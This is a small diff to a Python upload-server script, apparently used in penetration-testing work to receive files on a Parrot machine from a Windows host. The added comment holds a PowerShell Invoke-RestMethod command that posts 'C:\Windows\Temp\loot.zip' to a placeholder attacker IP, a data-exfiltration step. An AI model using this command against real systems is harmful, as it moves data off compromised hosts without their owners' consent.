@@ -1,7 +1,7 @@
 # This python code is useful to start python server.
 # often time I struggle to send some files my parrot from windows server.
-# change "loot.zip" to arbitary file name.
-# 
+# change "loot.zip" to arbitary file name. And I can send a file like as below.
+# Invoke-RestMethod -Uri "http://<Parrot IP>:8001/" -Method Post -InFile "C:\Windows\Temp\loot.zip" 
 import http.server
 
 class UploadHandler(http.server.BaseHTTPRequestHandler):
